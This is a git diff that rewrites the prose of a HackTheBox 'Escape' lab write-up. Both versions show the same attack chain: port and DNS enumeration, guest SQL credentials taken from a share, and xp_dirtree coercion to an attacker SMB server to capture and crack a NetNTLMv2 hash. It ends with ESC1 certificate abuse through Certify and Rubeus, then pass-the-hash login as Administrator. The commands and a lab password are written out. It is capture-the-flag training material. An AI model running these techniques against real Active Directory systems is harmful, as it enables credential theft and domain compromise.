@@ -7,7 +7,7 @@
 
 ### Port scan:
 
-Started with quick rustscan & found multiple open ports in the machine:
+I began the enumeration process by performing a quick port scan using rustscan, which revealed multiple open ports on the target machine:
 
 ```
 sudo rustscan -a 10.10.11.202 -- -sC -sV -vv -oN escape_nmap
@@ -241,22 +241,23 @@ Host script results:
 |   date: 2023-05-14T16:54:30
 |_  start_date: N/A
 ```
-From the port scan results I observed that there is a DC running in the machine, I added the observed domain to my /etc/hosts configuration.
+Upon analyzing the port scan results, I discovered the presence of a Domain Controller (DC) running on the machine. To facilitate access, I added the identified domains to my /etc/hosts configuration:
 
-  - sequel.htb
-  - dc.sequel.htb
+sequel.htb
+dc.sequel.htb
 
-I also observed that machine is running "Microsoft SQL Server 2019 RTM" as OS.
+Additionally, I noticed that the machine is running "Microsoft SQL Server 2019 RTM" as the operating system.
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ### DNS enumeration:
 
-I started further enumeration with checking other servers/domain running in the DNS.
+Continuing the enumeration, I proceeded to check for other servers/domains listed in the DNS.
 
 ```
 dig sequel.htb any @10.10.11.202
 ```
+The dig command provided the following response:
 
 ```
 ; <<>> DiG 9.18.12-1-Debian <<>> sequel.htb any @10.10.11.202
@@ -291,6 +292,7 @@ dc.sequel.htb.          1200    IN      AAAA    dead:beef::1dc
 ```
 dig sequel.htb any @10.10.11.202 -t NS
 ```
+The second dig command yielded the following result:
 
 ```
 ;; Warning, extra type option
@@ -320,27 +322,27 @@ dc.sequel.htb.          3600    IN      AAAA    dead:beef::1dc
 ;; MSG SIZE  rcvd: 128
 ```
 
-From the DNS enumeration I found another domain in the results : "hostmaster.sequel.htb", which I added to the hosts file.
+During the DNS enumeration, I came across another domain in the results: "hostmaster.sequel.htb". Consequently, I added this domain to the hosts file for further reference.
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 ### SMB enumeration:
 
-After going through the port scan & digging the DNS, I decided to enumerate the network shares.
+After conducting the port scan and performing DNS analysis, I proceeded with enumerating the network shares.
 
 ```
 smbmap -H dc.sequel.htb -u DoesNotExist
 ```
 
-I found only 2 network share drive in which I have read access: IPC$ & Public.
+The smbmap command revealed two network shares with read access: IPC$ and Public.
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/b6657364-30d4-4f2a-ad4a-b682d43ba893)
 
-In the public directory I observed a file "SQL Server Procedures.pdf", which I downloaded into my attacking machine.
+Within the Public directory, I discovered a file named "SQL Server Procedures.pdf" and downloaded it to my attacking machine.
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/dc65bd3f-15d4-48ca-950c-17b29975b92e)
 
-In the PDF I got a user "brandon.brown" & Guest credentials to access the SQL data base. Also, the command to access the data base from non-domain joined devices:
+The PDF contained information about a user named "brandon.brown" and the Guest credentials to access the SQL database. Additionally, it provided a command to access the database from non-domain joined devices:
 
 ```
 cmdkey /add:"<serverName>.sequel.htb" /user:"sequel\<userame>" /pass:<password>
@@ -352,16 +354,16 @@ cmdkey /add:"<serverName>.sequel.htb" /user:"sequel\<userame>" /pass:<password>
 
 ### User enumeration with CME:
 
-After checking the network shares it's time to gather the domain user related info, for which I used rid-brute option in CrackMapExec:
+After examining the network shares, it's time to gather information about domain users. I utilized the **rid-brute** option in CrackMapExec for this purpose:
 
 ```
 crackmapexec smb sequel.htb -u "guest" -p "" --rid-brute
 ```
-I got plenty of domains users in the results:
+The results yielded numerous domain users:
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/882f92b2-ee31-4513-a7d6-cc2c825ebdb8)
 
-With the gathered credentials I tried to perform the AS-REP roasting to checking if there is any account that “Do not require Kerberos pre-authentication" but from the results it seems like all the accounts requires pre-authentication. 😕
+Using the obtained credentials, I attempted AS-REP roasting to identify any accounts that "Do not require Kerberos pre-authentication." However, it appears that all the accounts require pre-authentication. 😕
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/86abd543-ff8b-4d01-ae17-6df0d9c339dc)
 
@@ -369,7 +371,7 @@ With the gathered credentials I tried to perform the AS-REP roasting to checking
 
 ## Intital access:
 
-With the Guest credential I tried to access the SQL server using an Impacket script "mssqlclient.py"
+Using the Guest credentials, I attempted to access the SQL server using the Impacket script "mssqlclient.py":
 
 ```
 python3 mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
@@ -377,9 +379,9 @@ python3 mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2484dbe1-8969-4d29-9f29-af964c8d7626)
 
-After getting into SQL server I did perform some search on Google & found I can use 'xp_dirtree' command to access remote files from shares. So, if I will just start a SMB server & point the SQL server towards my network share then there is a possibility that while autheticating to SMB share the service account might expose it's hashed credential.
+Once inside the SQL server, I conducted a Google search and discovered that I could use the 'xp_dirtree' command to access remote files from shares. By starting an SMB server and directing the SQL server to my network share, there was a possibility that the service account would expose its hashed credentials during the authentication process.
 
-I started SMBv2 server using another Impacket script & point the SQL server towards my SMB enabled host, which exposed the NetNTLMv2 hash in the response:
+I launched an SMBv2 server using another Impacket script and directed the SQL server to my SMB-enabled host. This exposed the NetNTLMv2 hash in the response:
 
 ```
 python3 impacket/examples/smbserver.py kill3r . -smb2support
@@ -390,11 +392,11 @@ SQL> xp_dirtree '\\10.10.14.3\kill3r'
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/188f1598-1202-4267-9902-af0eab6b63bf)
 
-I used 'hashcat' to crack the NetNTLMv2 hash & found the clear text password.
+I used 'hashcat' to crack the NetNTLMv2 hash and obtained the clear text password.
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c9043af9-e9bb-4cfa-8558-5c8e7bd7d0e7)
 
-Using the cracked credentials of 'sql_svc' service account I finally got the initial access into the host via Evil-WinRM: (pwn3d!🙂)
+Finally, using the cracked credentials of the 'sql_svc' service account, I gained initial access to the host via Evil-WinRM: (pwn3d!🙂)
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5e7a5fa4-db30-4090-a511-5b56444e7d2b)
 
@@ -402,16 +404,15 @@ Using the cracked credentials of 'sql_svc' service account I finally got the ini
 
 ### User.txt:
 
-While I am into the network I still not have the user flag & running the enumeration as 'sql_svc', while performing the enumeration I observed a folder in a 'C:\' drive called 'SQLServer'.
-In that folder I observed a Logs folder which contains Error logs of the users:
+Although I had gained access to the network, I had not yet obtained the user flag. While conducting enumeration under the 'sql_svc' account, I noticed a folder called 'SQLServer' on the 'C:' drive. Within this folder, there was a 'Logs' directory containing error logs related to users.
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/6cdbf1bf-db3f-484b-a4e3-36acc9a58f8e)
 
-In the log file I observed credential of the user 'Ryan.Cooper':
+In one of the log files, I discovered the credentials of the user 'Ryan.Cooper':
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/77a90705-53ab-4105-9abe-6e1c57236a3c)
 
-Using the gathered credentials I finally able to log in, into the Ryan account & got the user flag. (pwn3d!🙂)
+With the obtained credentials, I successfully logged in as Ryan and obtained the user flag. (pwn3d!🙂)
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/ff2355e2-fed3-4165-9006-a5e7ce7fa3a4)
 
@@ -419,15 +420,13 @@ Using the gathered credentials I finally able to log in, into the Ryan account &
 
 ## Privilege Escalation:
 
-To get root flag I have to escalate my privileges from Ryan to the Administrator user. I started with checking Winpeas but didn't get any useful info to escalate my privilege.
+In order to obtain the root flag, I needed to elevate my privileges from Ryan to the Administrator user. I started by running Winpeas, but it didn't provide any useful information for privilege escalation.
 
-After failing to get possible vector to escalate my privilege I moved on to check vulnerable certificates after which I can impersonate the Administraor user.
+Since the initial approach didn't yield any results, I decided to explore vulnerable certificates as a potential vector for impersonating the Administrator user. I used 'Certify' tool for enumerating and exploiting vulnerable certificates, following this [guide](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin).
 
-I used 'Certify' to enumerate for vulnerable certificates while following this [guide](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin) for the enumeration & exploitation purpose.
+To perform the enumeration and exploitation, I downloaded the compiled 'Certify.exe' from this [GitHub repository](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries).
 
-I download the compiled 'Certify.exe' from this [Github repo](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries).
-
-To search for the vulnerable certificate I used this command:
+For searching vulnerable certificates, I used the following command:
 
 ```
 .\certify.exe find /vulnerable /currentuser
@@ -435,7 +434,7 @@ To search for the vulnerable certificate I used this command:
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/96848b2e-ec6e-48ed-bf55-4d82c2b19a05)
 
-Moving forward with the guide I have to request a new certificate on behalf of a domain administator using Certify by specifying the following parameters:
+Following the guide, I needed to request a new certificate on behalf of a domain administrator using Certify. I specified the following parameters:
 
 ```
  - /ca - speciffies the Certificate Authority server we're sending the request to;
@@ -448,26 +447,25 @@ Moving forward with the guide I have to request a new certificate on behalf of a
 ```
 .\certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator
 ```
-From the certify results we can see that the certificate in PEM format has been issued successfully:
+From the Certify results, it can be seen that the certificate in PEM format has been successfully issued:
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/06511bbe-11a1-4025-9ff9-a6e152e5ef29)
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/8f7a08ac-bdde-4dea-82bc-91d6138f79a3)
 
-Now, I have to convert the certificate which we retrieved from PEM to PFX format. I saved the certificate in cert.pem file in my attack box.
-And, executed below command to generate 'cert.pfx' file:
+Next, I needed to convert the certificate from PEM to PFX format. I saved the certificate in a file named cert.pem on my attack box and executed the following command:
 
 ```
 openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
 ```
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/658530bf-c98a-42ea-955e-052248835526)
 
-note: I left the password part blank.
+Note: I left the password field blank.
 
-Once the cert.pfx is generated, I uploaded it to the windows machine:
+Once the cert.pfx file was generated, I uploaded it to the Windows machine:
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/4f56bc7b-0c96-478c-b6cb-eb02c9f94f60)
 
-After the upload I used Rubeus to obtain Administrator credentials:
+After uploading the file, I used Rubeus to obtain Administrator credentials:
 
 ```
 .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
@@ -476,10 +474,9 @@ After the upload I used Rubeus to obtain Administrator credentials:
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/ef1316fa-dd5c-4d90-a685-f5fbe1500e59)
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/91e3ed5e-a3d5-45e8-8811-d28122bb0f82)
 
-Since, I have the Administrator NTLM hash, I can crack it or to save time I can use it directly to login using evil-winrm.
+Since I had the Administrator NTLM hash, I could either crack it or, to save time, use it directly to log in using evil-winrm.
 
 ![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/3feef42c-2442-4567-8370-d3fec37d69b1)
 
-After logging using Admin Hash, I finally got the root.txt. (pwn3d!🙂)
-
+After logging in using the Admin Hash, I finally obtained the root.txt flag. (pwn3d!🙂)
 
